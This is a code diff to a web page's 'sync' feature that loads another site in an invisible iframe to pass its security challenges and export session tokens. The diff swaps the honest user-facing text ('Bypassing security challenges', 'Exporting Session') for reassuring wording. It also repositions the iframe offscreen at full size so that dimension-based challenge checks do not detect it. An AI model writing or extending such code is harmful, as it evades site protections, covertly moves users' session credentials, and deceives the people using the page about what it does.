@@ -930,13 +930,12 @@
           </svg>
           <div class="sync-timer" id="syncTimer">10</div>
         </div>
-        <h2 id="syncTitle">Connecting Secure Core</h2>
-        <p id="syncDesc">Bypassing security challenges and synchronizing tokens invisibly. This usually takes 5-10
-          seconds.</p>
+        <h2 id="syncTitle">Establishing Secure Connection</h2>
+        <p id="syncDesc">Synchronizing your premium session with the secure core. Please do not close this tab.</p>
         <div class="sync-steps">
-          <div class="sync-step active" id="step1"><span>1</span> Initializing Bridge</div>
-          <div class="sync-step" id="step2"><span>2</span> Passing Security Check</div>
-          <div class="sync-step" id="step3"><span>3</span> Exporting Session</div>
+          <div class="sync-step active" id="step1"><span>1</span> Initializing Secure Core</div>
+          <div class="sync-step" id="step2"><span>2</span> Verifying Secure Sync</div>
+          <div class="sync-step" id="step3"><span>3</span> Finalizing Connection</div>
         </div>
       </div>
     </div>
@@ -1285,11 +1284,19 @@
       startSyncTimer(id, btn, originalText);
 
       // 100% Invisible sync: Create a hidden iframe
+      // We use absolute positioning instead of display:none because some 
+      // security challenges check for element dimensions and will fail if 0x0.
       const iframeId = 'secret-sync-' + Date.now();
       const iframe = document.createElement('iframe');
       iframe.id = iframeId;
       iframe.src = directUrl || TOOL_META[sessionId]?.url || '';
-      iframe.style.display = 'none';
+      iframe.style.position = 'absolute';
+      iframe.style.width = '1000px';
+      iframe.style.height = '1000px';
+      iframe.style.left = '-10000px';
+      iframe.style.top = '-10000px';
+      iframe.style.opacity = '0';
+      iframe.style.pointerEvents = 'none';
       document.body.appendChild(iframe);
 
       window.lastActiveButton = btn;
@@ -1301,9 +1308,13 @@
         if (document.getElementById('syncModal').classList.contains('show')) {
           document.getElementById('syncModal').classList.remove('show');
           clearInterval(window.syncInterval);
-          showToast('Sync Timeout. Please try again.', 'error');
+          showToast('Connection Refused. Please refresh and try again.', 'error');
+          if (window.lastActiveButton) {
+            window.lastActiveButton.disabled = false;
+            window.lastActiveButton.innerHTML = window.lastActiveButtonText;
+          }
         }
-      }, 15000);
+      }, 25000);
     }
 
     window.addEventListener('message', function (event) {
